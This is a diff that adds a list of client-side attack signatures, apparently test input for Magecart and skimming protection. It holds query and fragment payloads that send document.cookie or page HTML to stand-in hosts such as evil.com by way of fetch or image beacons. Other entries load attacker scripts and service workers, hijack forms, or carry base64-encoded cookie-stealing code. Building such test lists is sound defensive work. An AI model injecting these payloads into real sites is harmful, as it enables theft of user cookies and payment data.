@@ -1,0 +1,63 @@
+# Client-Side Attack Signatures
+# Testing for Magecart, skimming, and client-side protection
+
+# ==== Data Exfiltration Signatures ====
+?callback=https://evil.com/collect
+?webhook=http://attacker.com/steal
+?redirect=https://evil.com/log?data=
+?img=//evil.com/pixel.gif
+?beacon=https://attacker.com/b
+
+# ==== Inline JavaScript Injection ====
+?onload=eval(atob('YWxlcnQoMSk='))
+?onclick=fetch('//evil.com/'+document.cookie)
+?onerror=new Image().src='//evil.com/'+document.cookie
+
+# ==== DOM-based Exfiltration ====
+#<script>new Image().src='//evil.com/c?c='+document.cookie</script>
+#<script>fetch('//evil.com/'+btoa(document.body.innerHTML))</script>
+
+# ==== External Script Loading ====
+?script=//evil.com/malicious.js
+?src=https://attacker.com/payload.js
+?js=data:text/javascript,alert(1)
+
+# ==== Form Hijacking Signatures ====
+?action=https://evil.com/steal
+?formdata=//attacker.com/collect
+?submit=javascript:sendData()
+
+# ==== Keylogger Signatures ====
+?keylog=//evil.com/keys
+?input_handler=https://attacker.com/log
+
+# ==== Payment Form Skimming Patterns ====
+?cc_exfil=true
+?payment_callback=//evil.com
+?card_data=https://attacker.com/cc
+
+# ==== Base64 Encoded Payloads ====
+?payload=YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
+?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+?code=bmV3IEltYWdlKCkuc3JjPScvL2V2aWwuY29tLycrZG9jdW1lbnQuY29va2ll
+
+# ==== WebSocket Hijacking ====
+?ws=wss://evil.com/socket
+?websocket=ws://attacker.com:8080
+
+# ==== PostMessage Abuse ====
+?postmessage_target=*
+?message_handler=evil
+
+# ==== Content Security Policy Bypass Attempts ====
+?nonce=
+?script-src=unsafe-inline
+?unsafe-eval=true
+
+# ==== Service Worker Injection ====
+?sw=//evil.com/sw.js
+?serviceworker=https://attacker.com/worker.js
+
+# ==== LocalStorage/SessionStorage Theft ====
+?storage_dump=true
+?localstorage=//evil.com/collect
